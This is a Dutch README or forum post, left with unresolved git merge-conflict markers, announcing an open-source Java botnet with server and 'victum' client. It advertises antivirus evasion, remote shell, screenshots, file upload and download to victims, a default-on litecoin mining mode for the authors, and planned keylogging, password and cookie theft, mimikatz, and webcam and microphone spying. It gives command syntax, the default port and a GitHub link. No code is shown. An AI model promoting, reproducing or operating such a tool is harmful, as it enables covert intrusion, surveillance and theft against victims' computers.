<<<<<<< HEAD
het staat nu definitief de source code van de botnet is open source. :D 


hier is een lijst van alle opties die nu werken en waar ik aan werk:
=======
# botnet server en client

het staat nu definitief de source code van de botnet is open source. :D 

hier is een lijst van alle opties die nu werken en waar ik aan werk (van vorige post: https://hackflag.org/forum/showthread.php?tid=6832 )
>>>>>>> origin/develop

    op het moment kan de botnet 1000 users aan, shell acces op iemands anders computer geven, informatie geven over de operating system, de externe ip en hostname meegeven tijdens de backdoor start, en heeft een test voor te checken of de backdoor nog loopt en doorgeven aan de botnet operator, een lijst geven van alle users op OS gefiltert en op een persoon of alle users een command sturen, screenshot nemen, downloaden en uploaden.

    dingen dat gedeeltelijk klaar zijn: Selfdestruct optie.

    de backdoor wordt niet gezien door virusscaners zoals avast, eset, norton, mcafee, avg enz.
    de backdoor en botnet zijn geschreven in java met netbeans.

    een ding wat hij nooit gaat doen is ddosen!
    ook geen ransomware!

    opties waar ik nog aan werk voor ik de botnet open source maak is vnc, webcam snapshot, een keylogger, Persistence backdoor, network scan met bijvoorbeeld nmap, passwoorden en cookies copiéren ( tel ik ook skype bij ), video op fullscreen dat niet kan gesloten worden, mimikatz ,Distributed hash cracking, microfoon afluisteren, popup voor credentials/ask van metasploit, scrypt mining.

<<<<<<< HEAD
hier de share naar de github source:


https://github.com/mh123hack/botnet-server-and-victum


=======
>>>>>>> origin/develop
een optie dat wel aan staat is sponsormode wat betekent dat via litecoin mining wordt geminned voor de makers van de botnet.
Maar dit kun je makkelijk af zetten door in de source code van de server sponsormode van true naar false te zetten.

dit zijn de opties die je kunt gebruiken:

list info = dat je een lijst krijgt van alle op hostname en extern ip dat ook in de variabele whoami zit.
msgbox = dat je een popup sherm kan maken aan de victums kant.
download = dat je vanaf de victum naar de server kunt sturen.
upload = dat je naar de victum iets via een url kan uploaden.
shell = dat je cmd commando's kan sturen je hoeft alleen geen cmd te tikken.
screenshot = dat e een screenshot krijgt van het standaard scherm en wordt gesttur naar de server.
javaversion = je krijgt de java version van de victum.
exit = sluit aan de victums kant het virus af.

bij de opties msgbox, download, upload, shell, screenshot, javaversion en exit moet je altijd meegeven de hostname en de externe ip zoals dit: mijnpc@1.2.3.4
<<<<<<< HEAD
je kunt dit makkelijk weten via de optie: list info

de standerd port van de server is 4600

=======
met als voorbeeld van een bericht: mijnpc@1.2.3.4 shell dir C:\
je kunt dit makkelijk weten via de optie: list info

de botnet werkt op windows en linux en misschien mac omdat ik dat niet heb getest.

de standerd port van de server is 4600
>>>>>>> origin/develop

ik hoop de je het een goede botnet vind :D

met vriendelijke groet
mh123hack
<<<<<<< HEAD
litecoin: LaLRA68RC6EdUdFFxtbkgzvmTSKRyFZndk

=======
litecoin: LaLRA68RC6EdUdFFxtbkgzvmTSKRyFZnd
>>>>>>> origin/develop
